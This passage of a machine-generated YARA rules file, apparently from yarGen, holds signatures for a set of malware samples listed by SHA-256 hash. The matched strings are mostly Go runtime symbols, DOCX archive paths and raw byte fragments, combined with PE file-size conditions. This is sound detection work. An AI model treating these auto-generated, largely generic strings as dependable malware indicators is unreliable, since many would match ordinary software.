      $s2 = "tempted to add zero-sized address rangebinary: varint overflows a 64-bit integercan't call pointer on a non-pointer ValuegcSweep" ascii /* score: '15.00'*/
      $s3 = "runtime: failed to signal runtime initialization complete." fullword ascii /* score: '13.00'*/
      $s4 = "runtime: failed to create new OS thread (%d)" fullword ascii /* score: '13.00'*/
      $s5 = "runtime.goPanicSlice3B" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.panicSlice3B" fullword ascii /* score: '10.00'*/
      $s7 = "runtime: failed to create runtime initialization wait event." fullword ascii /* score: '10.00'*/
      $s8 = "ind g runtime: checkdead: nmidle=runtime: corrupted polldescruntime: netpollinit failedruntime: thread ID overflowruntime" fullword ascii /* score: '10.00'*/
      $s9 = "runtime/cgo: out of memory in thread_start" fullword ascii /* score: '7.00'*/
      $s10 = "copyCheck" fullword ascii /* score: '4.00'*/
      $s11 = "_cgo_gotypes.go" fullword ascii /* score: '4.00'*/
      $s12 = "*strings.Builder" fullword ascii /* score: '4.00'*/
      $s13 = "e35527136788" ascii /* score: '1.00'*/
      $s14 = "SUATAUAVAWL" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s15 = "GCC: (tdm64-1) 5.1.0" fullword ascii /* score: '1.00'*/
      $s16 = "0476837158203125" ascii /* score: '1.00'*/
      $s17 = "*[8]int64" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and ( 8 of them )
      ) or ( all of them )
}

rule _41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c_497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b9_34 {
   meta:
      description = "mw - from files 41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c, 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c"
      hash2 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      hash3 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      hash4 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "runtime.offAddr.sub" fullword ascii /* score: '13.00'*/
      $s2 = "runtime.findrunnable" fullword ascii /* score: '10.00'*/
      $s3 = "runtime.newSpecialsIter" fullword ascii /* score: '10.00'*/
      $s4 = "runtime.semroot" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.addrRange.removeGreaterEqual" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.(*addrRanges).removeGreaterEqual" fullword ascii /* score: '7.00'*/
      $s7 = "runtime.(*addrRanges).removeLast" fullword ascii /* score: '7.00'*/
      $s8 = "runtime.(*addrRanges).cloneInto" fullword ascii /* score: '7.00'*/
      $s9 = "runtime.(*structfield).offset" fullword ascii /* score: '7.00'*/
      $s10 = "runtime.readyForScavenger" fullword ascii /* score: '6.00'*/
      $s11 = "runtime.scavengeSleep" fullword ascii /* score: '6.00'*/
      $s12 = "runtime.bgscavenge.func1" fullword ascii /* score: '6.00'*/
      $s13 = "runtime.wakeScavenger" fullword ascii /* score: '6.00'*/
      $s14 = "lerau3f" fullword ascii /* score: '4.00'*/
      $s15 = "memprofiH93u<" fullword ascii /* score: '4.00'*/
      $s16 = "runtime.(*pageAlloc).scavengeUnreserve" fullword ascii /* score: '3.00'*/
      $s17 = "runtime.(*pageAlloc).scavengeOne.func1" fullword ascii /* score: '3.00'*/
      $s18 = "runtime.(*pageAlloc).scavengeReserve" fullword ascii /* score: '3.00'*/
      $s19 = "runtime.(*pageAlloc).scavengeStartGen" fullword ascii /* score: '3.00'*/
      $s20 = "runtime.(*pageAlloc).scavengeRangeLocked" fullword ascii /* score: '3.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _34c1447f2bc18265a71260fd20c773301aab0ff700518ab2da8fe0ce9e55a2eb_497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b9_35 {
   meta:
      description = "mw - from files 34c1447f2bc18265a71260fd20c773301aab0ff700518ab2da8fe0ce9e55a2eb, 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "34c1447f2bc18265a71260fd20c773301aab0ff700518ab2da8fe0ce9e55a2eb"
      hash2 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
   strings:
      $s1 = "docProps/app.xml" fullword ascii /* score: '7.00'*/
      $s2 = "docProps/custom.xml" fullword ascii /* score: '7.00'*/
      $s3 = "word/_rels/PK" fullword ascii /* score: '4.00'*/
      $s4 = "docProps/custom.xmlPK" fullword ascii /* score: '4.00'*/
      $s5 = "docProps/PK" fullword ascii /* score: '4.00'*/
      $s6 = "_rels/PK" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s7 = "word/theme/PK" fullword ascii /* score: '4.00'*/
      $s8 = "word/PK" fullword ascii /* score: '4.00'*/
      $s9 = "word/_rels/document.xml.rels" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s10 = "word/fontTable.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s11 = "word/document.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s12 = "word/settings.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s13 = "word/_rels/document.xml.relsPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s14 = "word/styles.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s15 = "word/theme/theme1.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s16 = "word/theme/theme1.xml" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s17 = "word/styles.xml" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s18 = "word/settings.xml" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s19 = "word/fontTable.xml" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s20 = "word/document.xml" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 15000KB and ( 8 of them )
      ) or ( all of them )
}

rule _3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c_6c164e7b8698fe634374181710aa0cfc9316ecb8102ad0ecf4e5e44d9d_36 {
   meta:
      description = "mw - from files 3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c, 6c164e7b8698fe634374181710aa0cfc9316ecb8102ad0ecf4e5e44d9ded50b5, 6e705467c0c083d343ad4f9e2833cd229605257b034bd3c4ac3342b156fb1594, 9b2b902f5fd53b72cabfcc0e0191c876c92c1c748bcdbb7c00f9d62d7ba76914"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c"
      hash2 = "6c164e7b8698fe634374181710aa0cfc9316ecb8102ad0ecf4e5e44d9ded50b5"
      hash3 = "6e705467c0c083d343ad4f9e2833cd229605257b034bd3c4ac3342b156fb1594"
      hash4 = "9b2b902f5fd53b72cabfcc0e0191c876c92c1c748bcdbb7c00f9d62d7ba76914"
   strings:
      $s1 = "f;\\$4r" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s2 = "D$0@8{" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s3 = "f;\\$<r" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s4 = "vKfffff" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s5 = "rKf;\\$t" fullword ascii /* score: '1.00'*/
      $s6 = "u$D8r(t" fullword ascii /* score: '1.00'*/
      $s7 = "p0R^G'" fullword ascii /* score: '1.00'*/
      $s8 = "rvf;\\$d" fullword ascii /* score: '1.00'*/
      $s9 = "rsf;\\$d" fullword ascii /* score: '1.00'*/
      $s10 = "E80t\"A" fullword ascii /* score: '1.00'*/
      $s11 = "r7f;\\$|" fullword ascii /* score: '1.00'*/
      $s12 = "fD94Q}" fullword ascii /* score: '1.00'*/
      $s13 = "r:f;\\$|" fullword ascii /* score: '1.00'*/
      $s14 = "vAD8s(t" fullword ascii /* score: '1.00'*/
      $s15 = "rNf;\\$t" fullword ascii /* score: '1.00'*/
      $s16 = "rbf;\\$l" fullword ascii /* score: '1.00'*/
      $s17 = "r_f;\\$l" fullword ascii /* score: '1.00'*/
      $s18 = "fD94H}aD" fullword ascii /* score: '1.00'*/
      $s19 = "D81uUL9r" fullword ascii /* score: '1.00'*/
      $s20 = "uED8r(t" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e_790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fe_37 {
   meta:
      description = "mw - from files 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6, 90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      hash2 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      hash3 = "90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
   strings:
      $s1 = "internal/testlog.Open" fullword ascii /* score: '9.00'*/
      $s2 = "os.openFileNolog" fullword ascii /* score: '9.00'*/
      $s3 = "syscall.GetFullPathName" fullword ascii /* score: '8.00'*/
      $s4 = "syscall.GetFileAttributesEx" fullword ascii /* score: '8.00'*/
      $s5 = "os.(*File).ReadFrom" fullword ascii /* score: '7.00'*/
      $s6 = "encoding/hex.InvalidByteError.Error" fullword ascii /* score: '7.00'*/
      $s7 = "encoding/hex.(*InvalidByteError).Error" fullword ascii /* score: '7.00'*/
      $s8 = "os.genericReadFrom" fullword ascii /* score: '7.00'*/
      $s9 = "encoding/hex.Decode" fullword ascii /* score: '6.00'*/
      $s10 = "os.OpenFile" fullword ascii /* score: '4.00'*/
      $s11 = "os.(*onlyWriter).Write" fullword ascii /* score: '4.00'*/
      $s12 = "io.copyBuffer" fullword ascii /* score: '4.00'*/
      $s13 = "os.fixLongPath" fullword ascii /* score: '4.00'*/
      $s14 = "os.onlyWriter.Write" fullword ascii /* score: '4.00'*/
      $s15 = "os.volumeName" fullword ascii /* score: '4.00'*/
      $s16 = "os.openDir" fullword ascii /* score: '4.00'*/
      $s17 = "os.openFile" fullword ascii /* score: '4.00'*/
      $s18 = "syscall.CreateFile" fullword ascii /* score: '3.00'*/
      $s19 = "syscall.findFirstFile1" fullword ascii /* score: '3.00'*/
      $s20 = "syscall.FullPath" fullword ascii /* score: '3.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c_9b2b902f5fd53b72cabfcc0e0191c876c92c1c748bcdbb7c00f9d62d7b_38 {
   meta:
      description = "mw - from files 3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c, 9b2b902f5fd53b72cabfcc0e0191c876c92c1c748bcdbb7c00f9d62d7ba76914"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c"
      hash2 = "9b2b902f5fd53b72cabfcc0e0191c876c92c1c748bcdbb7c00f9d62d7ba76914"
   strings:
      $s1 = "f;\\$Lr" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s2 = "<St[A:" fullword ascii /* score: '1.00'*/
      $s3 = "u<g~l<it[<ntP<ot,<pt" fullword ascii /* score: '1.00'*/
      $s4 = "u,!T$(H!T$ " fullword ascii /* score: '1.00'*/
      $s5 = "~,*u<I" fullword ascii /* score: '1.00'*/
      $s6 = "NfD9d$pu" fullword ascii /* score: '1.00'*/
      $s7 = "{,D+{HD+" fullword ascii /* score: '1.00'*/
      $s8 = "fD9d$pt+fD" fullword ascii /* score: '1.00'*/
      $s9 = "<utK@:" fullword ascii /* score: '1.00'*/
      $s10 = ";D$hsC" fullword ascii /* score: '1.00'*/
      $s11 = "s5fE9!" fullword ascii /* score: '1.00'*/
      $s12 = "<St[@:" fullword ascii /* score: '1.00'*/
      $s13 = "fE9!fA" fullword ascii /* score: '1.00'*/
      $s14 = "fB9<A}1L" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b_41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4_39 {
   meta:
      description = "mw - from files 0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b, 41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c, 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6, 90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b"
      hash2 = "41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c"
      hash3 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash4 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      hash5 = "90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
      hash6 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "runtime.(*activeSweep).end" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.gcPaceSweeper" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.sysReserveAligned" fullword ascii /* score: '14.00'*/
      $s4 = "runtime.nilfunc" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.gcenable.func2" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.startPCforTrace" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.funcInfo.entry" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.stkobjinit" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.convTnoptr" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.convT" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.gcenable.func1" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.(*gcControllerState).resetLive" fullword ascii /* score: '7.00'*/
      $s13 = "runtime.(*piController).next" fullword ascii /* score: '7.00'*/
      $s14 = "runtime.(*moduledata).textAddr" fullword ascii /* score: '7.00'*/
      $s15 = "runtime.(*gcControllerState).update" fullword ascii /* score: '7.00'*/
      $s16 = "syscall.SyscallN" fullword ascii /* score: '7.00'*/
      $s17 = "runtime.cgocallbackg1.func3" fullword ascii /* score: '6.00'*/
      $s18 = "runtime.cgocallbackg1.func2" fullword ascii /* score: '6.00'*/
      $s19 = "syscall.(*LazyDLL).Load.func1" fullword ascii /* score: '5.00'*/
      $s20 = "runtime.(*pageAlloc).scavenge.func1" fullword ascii /* score: '3.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c_790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fe_40 {
   meta:
      description = "mw - from files 41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c"
      hash2 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      hash3 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "runtime.(*gcControllerState).logWorkTime" fullword ascii /* score: '16.00'*/
      $s2 = "goal  KiB total,  MB stacks,  [recovered] allocCount  found at *( gcscandone  m->gsignal= nDataRoots= nSpanRoots= pages/byte" fullword ascii /* score: '8.00'*/
      $s3 = "scannableStackSizeDelta" fullword ascii /* score: '5.00'*/
      $s4 = "z|PdOFP0O" fullword ascii /* score: '4.00'*/
      $s5 = "YoZWYtZiY6Z(" fullword ascii /* score: '4.00'*/
      $s6 = "runtime.(*pageAlloc).scavengeOneFast" fullword ascii /* score: '3.00'*/
      $s7 = "\\$0H9S0u!H" fullword ascii /* score: '2.00'*/
      $s8 = "\\$ 9SXt" fullword ascii /* score: '2.00'*/
      $s9 = "L$$H9\\$(" fullword ascii /* score: '1.00'*/
      $s10 = "Q@H9S@u" fullword ascii /* score: '1.00'*/
      $s11 = "L$pH9Q(" fullword ascii /* score: '1.00'*/
      $s12 = "Z(H9F u>" fullword ascii /* score: '1.00'*/
      $s13 = "P0O3P0O" fullword ascii /* score: '1.00'*/
      $s14 = "r09q0s'H9J" fullword ascii /* score: '1.00'*/
      $s15 = "IHH9KH" fullword ascii /* score: '1.00'*/
      $s16 = "v*3&4+@" fullword ascii /* score: '1.00'*/
      $s17 = "KjAiNj" fullword ascii /* score: '1.00'*/
      $s18 = "Q8H9S8u" fullword ascii /* score: '1.00'*/
      $s19 = "R8L+R(f" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c_6e705467c0c083d343ad4f9e2833cd229605257b034bd3c4ac3342b156_41 {
   meta:
      description = "mw - from files 3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c, 6e705467c0c083d343ad4f9e2833cd229605257b034bd3c4ac3342b156fb1594, 9b2b902f5fd53b72cabfcc0e0191c876c92c1c748bcdbb7c00f9d62d7ba76914, b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "3a9430e1b9d36d4a079b2197dd97d51e45adcaaf62bbcd4f06f73c680705a83c"
      hash2 = "6e705467c0c083d343ad4f9e2833cd229605257b034bd3c4ac3342b156fb1594"
      hash3 = "9b2b902f5fd53b72cabfcc0e0191c876c92c1c748bcdbb7c00f9d62d7ba76914"
      hash4 = "b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985"
   strings:
      $s1 = "f9t$bu" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s2 = "9Cu,fD9y" fullword ascii /* score: '1.00'*/
      $s3 = "D$HL9gXt" fullword ascii /* score: '1.00'*/
      $s4 = "t$`fD9+t$I" fullword ascii /* score: '1.00'*/
      $s5 = "d$dD;d$ltY" fullword ascii /* score: '1.00'*/
      $s6 = "fD94iu" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s7 = "L!d$(L!d$@D" fullword ascii /* score: '1.00'*/
      $s8 = "D$h9t$P" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( all of them )
      ) or ( all of them )
}

rule _b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985_f9d6bf219602f987be31d47917824960cdf466d4be2df33768b9f93905_42 {
   meta:
      description = "mw - from files b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985, f9d6bf219602f987be31d47917824960cdf466d4be2df33768b9f939054d0928"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985"
      hash2 = "f9d6bf219602f987be31d47917824960cdf466d4be2df33768b9f939054d0928"
   strings:
      $s1 = "k4+kP+" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s2 = "D$XD9x" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s3 = "u\"8Z(t" fullword ascii /* score: '1.00'*/
      $s4 = "<StW@:" fullword ascii /* score: '1.00'*/
      $s5 = "uF8Z(t" fullword ascii /* score: '1.00'*/
      $s6 = "D<P0@:" fullword ascii /* score: '1.00'*/
      $s7 = "<utT@:" fullword ascii /* score: '1.00'*/
      $s8 = "ue!T$(H!T$ " fullword ascii /* score: '1.00'*/
      $s9 = "vC8_(t" fullword ascii /* score: '1.00'*/
      $s10 = "<g~{<itd<ntY<ot7<pt" fullword ascii /* score: '1.00'*/
      $s11 = "vB8_(t" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( 8 of them )
      ) or ( all of them )
}

rule _41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c_44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fc_43 {
   meta:
      description = "mw - from files 41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c, 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c"
      hash2 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash3 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
   strings:
      $s1 = "*cipher.cbc" fullword ascii /* score: '7.00'*/
      $s2 = "crypto/cipher.dup" fullword ascii /* score: '7.00'*/
      $s3 = "NewCBCDecrypter" fullword ascii /* score: '6.00'*/
      $s4 = "crypto/cipher.(*cbcDecrypter).CryptBlocks" fullword ascii /* score: '6.00'*/
      $s5 = "crypto/cipher.NewCBCDecrypter" fullword ascii /* score: '6.00'*/
      $s6 = "crypto/cipher.(*cbcDecrypter).BlockSize" fullword ascii /* score: '6.00'*/
      $s7 = "*cipher.cbcDecrypter" fullword ascii /* score: '6.00'*/
      $s8 = "*cipher.BlockMode" fullword ascii /* score: '4.00'*/
      $s9 = "crypto/cipher.xorBytes" fullword ascii /* score: '4.00'*/
      $s10 = "crypto/cipher.newCBC" fullword ascii /* score: '4.00'*/
      $s11 = "CryptBlocks" fullword ascii /* score: '4.00'*/
      $s12 = "crypto/cipher.xorBytesSSE2" fullword ascii /* score: '4.00'*/
      $s13 = "\\$(t8vYF" fullword ascii /* score: '2.00'*/
      $s14 = " L9@0wE" fullword ascii /* score: '1.00'*/
      $s15 = "*cipher.cbcDecAble" fullword ascii /* score: '0.00'*/
      $s16 = "*func([]uint8) cipher.BlockMode" fullword ascii /* score: '0.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _6b3be5de40b3f2d063389b53e5fc63950ee2b9aad46d5ecc1e23c546746952b3_c0b4b7b1183401644c556b5cc8e92c0f13970a370fca43635785f65f81_44 {
   meta:
      description = "mw - from files 6b3be5de40b3f2d063389b53e5fc63950ee2b9aad46d5ecc1e23c546746952b3, c0b4b7b1183401644c556b5cc8e92c0f13970a370fca43635785f65f81e9a1d5, c879b4f8bd38ddc5797d625effb573e7478dbc57efb3c99593c2a5a98d12b641"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "6b3be5de40b3f2d063389b53e5fc63950ee2b9aad46d5ecc1e23c546746952b3"
      hash2 = "c0b4b7b1183401644c556b5cc8e92c0f13970a370fca43635785f65f81e9a1d5"
      hash3 = "c879b4f8bd38ddc5797d625effb573e7478dbc57efb3c99593c2a5a98d12b641"
   strings:
      $s1 = "_get_initial_narrow_environment" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s2 = "_set_new_mode" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s3 = "_set_app_type" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s4 = "_seh_filter_exe" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s5 = "_register_thread_local_exe_atexit_callback" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and ( all of them )
      ) or ( all of them )
}

rule _b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985_d3bd4efe6795d73420f670212e364814b03e8e844b351518a76703c0ff_45 {
   meta:
      description = "mw - from files b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985, d3bd4efe6795d73420f670212e364814b03e8e844b351518a76703c0ff22c68d"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "b225c6740e94211a16770e0fd1f0118b78a99f428bb7e7d4943b3e290c30b985"
      hash2 = "d3bd4efe6795d73420f670212e364814b03e8e844b351518a76703c0ff22c68d"
   strings:
      $s1 = "gdi32.dlH" fullword ascii /* score: '7.00'*/
      $s2 = "The average marks obtained in subject %d is: %.2f" fullword ascii /* score: '7.00'*/
      $s3 = "SetObjectOwner" fullword ascii /* score: '4.00'*/
      $s4 = "Matched!" fullword ascii /* score: '4.00'*/
      $s5 = "ctOwner" fullword ascii /* score: '4.00'*/
      $s6 = "SetObjecH" fullword ascii /* score: '4.00'*/
      $s7 = "          manifestVersion=\"1.0\">" fullword ascii /* score: '2.00'*/
      $s8 = "X[_^A^" fullword ascii /* score: '1.00'*/
      $s9 = "3! = %i" fullword ascii /* score: '1.00'*/
      $s10 = "0! = %i" fullword ascii /* score: '1.00'*/
      $s11 = "1! = %i" fullword ascii /* score: '1.00'*/
      $s12 = "5! = %i" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( 8 of them )
      ) or ( all of them )
}

rule _44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9_790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fe_46 {
   meta:
      description = "mw - from files 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6, 90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash2 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      hash3 = "90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
      hash4 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "crypto.init" fullword ascii /* score: '7.00'*/
      $s2 = "reflect.verifyNotInHeapPtr" fullword ascii /* score: '7.00'*/
      $s3 = "crypto/md5.New" fullword ascii /* score: '7.00'*/
      $s4 = "reflect.intFromReg" fullword ascii /* score: '7.00'*/
      $s5 = "reflect.intToReg" fullword ascii /* score: '7.00'*/
      $s6 = "sync.(*Once).doSlow.func2" fullword ascii /* score: '4.00'*/
      $s7 = "sync.(*Pool).pinSlow.func1" fullword ascii /* score: '4.00'*/
      $s8 = "fmt.(*pp).handleMethods.func3" fullword ascii /* score: '4.00'*/
